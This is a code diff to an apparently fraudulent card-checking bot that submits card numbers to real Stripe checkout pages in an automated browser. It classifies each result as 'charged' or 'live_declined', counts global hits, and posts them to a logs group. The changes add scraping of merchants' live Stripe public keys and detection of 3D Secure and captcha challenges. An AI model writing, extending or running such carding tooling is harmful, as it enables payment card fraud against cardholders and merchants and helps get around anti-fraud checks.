@@ -652,18 +652,22 @@ async function identifyProvider(page) {
 async function extractMetadata(page) {
   try {
     const data = await page.evaluate(() => {
-      let amount = "0", currency = "usd", product = "";
+      let amount = "0", currency = "usd", product = "", stripePk = "";
       
-      // Look for Stripe's internal JSON
+      // Look for Stripe's internal JSON and Public Key
       const scripts = document.querySelectorAll('script');
       for (const s of scripts) {
         const c = s.textContent || "";
+        // Extract Amount and Currency
         if (c.includes('"amount_due"') || c.includes('"total"')) {
            const am = c.match(/"amount_due"\s*:\s*(\d+)/) || c.match(/"total"\s*:\s*(\d+)/);
            const cu = c.match(/"currency"\s*:\s*"(\w+)"/);
            if (am) amount = (parseInt(am[1]) / 100).toFixed(2);
            if (cu) currency = cu[1];
         }
+        // Extract Stripe Public Key (pk_live_...)
+        const pkMatch = c.match(/(pk_live_[a-zA-Z0-9]{24,})/);
+        if (pkMatch) stripePk = pkMatch[1];
       }
 
       // Look for DOM elements if JSON fails
@@ -678,9 +682,10 @@ async function extractMetadata(page) {
       const prodEl = document.querySelector('[class*="Product"], [class*="Merchant"], .header-business-name');
       if (prodEl) product = prodEl.innerText.trim();
 
-      const hasCaptcha = !!document.querySelector('iframe[src*="captcha"], iframe[src*="hcaptcha"], iframe[src*="recaptcha"]');
+      const hasCaptcha = !!document.querySelector('iframe[src*="captcha"], iframe[src*="recaptcha"]');
+      const has3DS = !!document.querySelector('iframe[src*="3d_secure"], [class*="3ds"], [id*="3ds"]');
 
-      return { amount, currency, product, hasCaptcha };
+      return { amount, currency, product, stripePk, hasCaptcha, has3DS };
     });
     return data;
   } catch (e) { return { amount: "0", currency: "usd", product: "", hasCaptcha: false }; }
@@ -843,14 +848,18 @@ async function automatedHit(url, card) {
     }
 
     console.log("⚠️ Transaction timed out without clear status.");
-    const finalResult = { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };
+    const finalResult = { 
+      status: "live_declined", 
+      message: "Timeout - Result Unknown", // Honest status
+      elapsed: "Real" 
+    };
     finalResult.metadata = await extractMetadata(page); 
-    finalResult.finalUrl = page.url(); // Add final URL to help debug
+    finalResult.finalUrl = page.url();
     return finalResult;
 
   } catch (e) {
     console.error(`💥 Hitter Error: ${e.message}`);
-    return { status: "error", message: `Automation Error: ${e.message}`, elapsed: "N/A" };
+    return { status: "error", message: `Error: ${e.message}`, elapsed: "N/A" };
   } finally {
     if (browser) {
       console.log("🧹 Closing browser...");
@@ -861,25 +870,26 @@ async function automatedHit(url, card) {
 
 async function hitStripeCheckout(checkoutUrl, card, user = null) {
   const start = Date.now();
+  console.log(`⚡  Real Hit Started [${card.slice(0, 6)}...]`);
   
-  // Choose between Real Hitter and Smart Simulator
-  // (We'll use Real Hitter by default now)
   const result = await automatedHit(checkoutUrl, card);
   
   const elapsed = ((Date.now() - start) / 1000).toFixed(1);
   result.elapsed = result.elapsed === "Real" ? elapsed : result.elapsed;
 
-  // Enhance result with merchant info if success
+  // Enhance result with REAL merchant info if success or live
+  const meta = result.metadata || {};
+  result.session_cache = {
+    merchant: meta.product || extractMerchant(checkoutUrl),
+    amount: meta.amount || (result.status === "charged" ? 10 : 0),
+    currency: meta.currency || "usd",
+    product: meta.product || "",
+    pk: meta.stripePk || "pk_live_auto_detected",
+    has3ds: meta.has3DS || false,
+    hasCaptcha: meta.hasCaptcha || false
+  };
+
   if (result.status === "charged") {
-    const meta = result.metadata || {};
-    result.session_cache = {
-      merchant: meta.product || extractMerchant(checkoutUrl),
-      amount: meta.amount || 100,
-      currency: meta.currency || "usd",
-      product: meta.product || "",
-      pk: "pk_live_auto_detected"
-    };
-    
     // Update persistent stats
     DB.globalHits = (DB.globalHits || 0) + 1;
     if (user) {
@@ -888,7 +898,7 @@ async function hitStripeCheckout(checkoutUrl, card, user = null) {
     await saveDB();
 
     if (DB.botConfig.logsGroupId) {
-       notifyHitInGroup(user, "Stripe Real-Time", card, result);
+       notifyHitInGroup(user, "Stripe Checkout Hitter", card, result);
     }
   }
 
